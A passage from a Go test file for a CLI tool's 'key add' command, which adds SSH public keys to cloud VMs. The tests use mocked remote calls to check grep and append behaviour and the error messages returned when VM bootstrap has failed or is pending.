		t.Errorf("grep command should contain '|| true' to tolerate missing files, got: %s", grepScript)
	}

	// Verify append is a single-element command that creates .ssh directory on fresh VMs.
	appendCall := remote.calls[1]
	if len(appendCall.command) != 1 {
		t.Fatalf("append call must be a single-element command slice, got %d: %v", len(appendCall.command), appendCall.command)
	}
	appendScript := appendCall.command[0]
	if !strings.Contains(appendScript, "mkdir -p") {
		t.Errorf("append command should contain mkdir -p for fresh VMs, got: %s", appendScript)
	}

	// Output should indicate key was added.
	output := buf.String()
	if !strings.Contains(output, "Added") {
		t.Errorf("output should say key was added, got: %s", output)
	}
}

func TestKeyAddGrepNoMatchProceedsToAppend(t *testing.T) {
	// When grep finds no matching key (exit code 1 in real execution),
	// the sh -c wrapper with "|| true" returns empty output and no error.
	// The command should proceed to append the key.
	remote := &keyMockRemote{output: []byte{}} // empty output = no match
	deps := &keyAddDeps{
		describe:       &mockDescribeForSSH{output: makeRunningInstanceWithAZ("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a")},
		sendKey:        &mockSendSSHPublicKey{output: &ec2instanceconnect.SendSSHPublicKeyOutput{Success: true}},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:nomatch", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should proceed to append (2 calls: grep + append).
	if len(remote.calls) != 2 {
		t.Fatalf("expected 2 remote calls (grep + append), got %d", len(remote.calls))
	}

	output := buf.String()
	if !strings.Contains(output, "Added") {
		t.Errorf("output should say key was added, got: %s", output)
	}
}

func TestKeyAddBootstrapFailed(t *testing.T) {
	// Bug #139: mint key add should return a helpful error when bootstrap=failed,
	// not proceed to keyscan and produce a useless "ssh-keyscan failed: exit status 1".
	remote := &keyMockRemote{}
	deps := &keyAddDeps{
		describe: &mockDescribeForSSH{
			output: makeRunningInstanceWithBootstrap("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a", "failed"),
		},
		sendKey:        &mockSendSSHPublicKey{},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 test", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error when bootstrap=failed, got nil")
	}
	if !strings.Contains(err.Error(), "bootstrap failed") {
		t.Errorf("error should mention 'bootstrap failed', got: %s", err.Error())
	}
	if !strings.Contains(err.Error(), "mint recreate") {
		t.Errorf("error should mention 'mint recreate', got: %s", err.Error())
	}
	// Remote runner must NOT be called — SSH is not available.
	if len(remote.calls) != 0 {
		t.Errorf("remote runner should not be called when bootstrap failed, got %d calls", len(remote.calls))
	}
}

func TestKeyAddBootstrapPending(t *testing.T) {
	// Bug #139: mint key add should return a helpful error when bootstrap=pending,
	// not attempt keyscan on a VM that isn't ready yet.
	remote := &keyMockRemote{}
	deps := &keyAddDeps{
		describe: &mockDescribeForSSH{
			output: makeRunningInstanceWithBootstrap("i-abc123", "default", "alice", "1.2.3.4", "us-east-1a", "pending"),
		},
		sendKey:        &mockSendSSHPublicKey{},
		owner:          "alice",
		remoteRunner:   remote.run,
		hostKeyStore:   sshconfig.NewHostKeyStore(t.TempDir()),
		hostKeyScanner: mockHostKeyScanner("SHA256:testfp", "ssh-ed25519 test", nil),
		fingerprintFn:  func(key string) (string, error) { return "SHA256:test", nil },
	}

	cmd := newKeyAddCommandWithDeps(deps)
	root := newTestRootForKey()
	root.AddCommand(newKeyCommandWithChild(cmd))

	buf := new(bytes.Buffer)
	root.SetOut(buf)
	root.SetErr(buf)
	root.SetArgs([]string{"key", "add", testEd25519Key})

	err := root.Execute()
	if err == nil {
		t.Fatal("expected error when bootstrap=pending, got nil")
	}
	if !strings.Contains(err.Error(), "bootstrap is not complete") {
		t.Errorf("error should mention 'bootstrap is not complete', got: %s", err.Error())
	}
	// Remote runner must NOT be called — SSH is not available yet.
	if len(remote.calls) != 0 {
		t.Errorf("remote runner should not be called when bootstrap is pending, got %d calls", len(remote.calls))
	}
}

// newKeyCommandWithChild creates a key parent command with the given child added.
func newKeyCommandWithChild(child *cobra.Command) *cobra.Command {
	parent := &cobra.Command{
		Use:   "key",
		Short: "Manage SSH keys",
	}
	parent.AddCommand(child)
	return parent
}
